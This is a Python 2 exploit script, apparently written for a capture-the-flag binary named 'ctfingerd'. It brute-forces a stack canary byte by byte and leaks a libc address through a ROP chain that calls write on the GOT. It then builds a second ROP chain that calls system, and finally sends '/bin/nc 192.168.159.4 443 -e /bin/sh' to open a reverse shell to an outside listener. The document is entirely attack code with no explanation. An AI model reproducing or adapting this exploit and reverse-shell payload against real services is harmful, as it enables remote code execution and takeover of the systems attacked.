from socket import *
import time
from struct import *

host = "127.0.0.1"
# host = "192.168.159.133"
port = 7979

def find_canary_pos():
        print "[+] Finding canary position..."
        canary_pos = 995
        while True:
                s = socket(AF_INET, SOCK_STREAM)
                s.connect((host, 7979))
                response = s.recv(1024)
                s.send("A"* canary_pos)
                time.sleep(0.1)
                response = s.recv(1024)
                s.close()
                if "---" not in response:
                        break
                canary_pos = canary_pos + 1
        return canary_pos - 1

def bruteforce_canary(canary_pos):
        # (b...)(a...)(d..)(c.........)(CANARY)(CTLI)(RETA)
        # .............................(A     )......... >> ret an error 
        # .............................(C     )......... >> ret no error 
        # .............................(CA    )......... >> ret no error
        # .............................(CAN   )......... >> ret no error
        # ...so on... 
        print "[+] Bruteforcing canary..."
        canary = ""
        for byte in xrange(8):
                for cnr in xrange(256):
                        hex_byte = chr(cnr)
                        tmp_cnr = canary + hex_byte
                        s = socket(AF_INET, SOCK_STREAM)
                        s.connect((host, port))
                        s.recv(1024)
                        payload = "A" * canary_pos + tmp_cnr
                        s.send(payload)
                        s.recv(1024)
                        time.sleep(0.1)
                        rec = s.recv(1024)
                        s.close()
                        if "---" in rec:
                                canary = tmp_cnr
                                print("[+] Found byte("+str(byte)+"): " + hex_byte.encode("hex"))
                                break
        return canary


canary_position = find_canary_pos()
print "[+] Canary position: " + str(canary_position)
canary = bruteforce_canary(canary_position)
print "[+] Canary: " + canary.encode("hex")
#  Find sock FD to change stdout to socket
s = socket()
s.connect((host, port))
response = s.recv(1024)
fd_pos = response.find("Socket FD: ")
socket_FD = int(response[fd_pos + 11:response.find("\n",fd_pos + 5)])
print "[+] Socket FD: " + str(socket_FD)

libc_memset_offset = 0x85620 # readelf -s libc.so.6 | grep memset
libc_system_offset = 0x41490 # readelf -s libc.so.6 | grep system
write_plt = 0x400920 # objdump -d ./ctfingerd | grep -A5 write@
read_plt = 0x4009b0 # objdump -d ./ctfingerd | grep -A5 read@
memset_GOT = 0x6014e0 # objdump -R ./ctfingerd | grep memset
poprdi_OP = 0x00401013 # pop rdi; ret obcode
poprsi_OP = 0x00401011 # pop rsi ; pop r15 ; ret obcode

payload = "A" * canary_position
payload += canary
payload += pack("<Q", 0x00)
payload += pack("<Q", poprdi_OP)
payload += pack("<Q", socket_FD)
payload += pack("<Q", poprsi_OP)
payload += pack("<Q", memset_GOT)
payload += pack("<Q", 0x00)
payload += pack("<Q", write_plt)
s.send(payload)
time.sleep(0.1)
response = s.recv(1024)
s.shutdown(1)
s.close()
split = response.split("\n")
memset_addr = unpack("<Q", split[2][:8])
libc_base = (memset_addr[0] - libc_memset_offset)
system_addr = (libc_base + libc_system_offset)

print "[+] Leaked memset addr: ", hex(memset_addr[0])
print "[+] libc base addr: ", hex(libc_base)
print "[+] sysem addr: ", hex(system_addr)

socket_FD = socket_FD + 1
print "[+] New Socket FD" + str(socket_FD)

payload = ""
payload += "A" * canary_position
payload += canary
payload += pack("<Q", 0x00)
payload += pack("<Q", poprdi_OP)
payload += pack("<Q", socket_FD)
payload += pack("<Q", poprsi_OP)
payload += pack("<Q", 0x601010)
payload += pack("<Q", socket_FD)           
payload += pack("<Q", read_plt)
payload += pack("<Q", poprdi_OP)
payload += pack("<Q", 0x601010)
payload += pack("<Q", system_addr)

s = socket()
s.connect((host, port))
print s.recv(1024)
s.send(payload)
time.sleep(0.1)

print "[+] Exploit..."
for i in range(0, 1000):
        s.send('/bin/nc 192.168.159.4 443 -e /bin/sh\x00')
# # nc -lnvp 443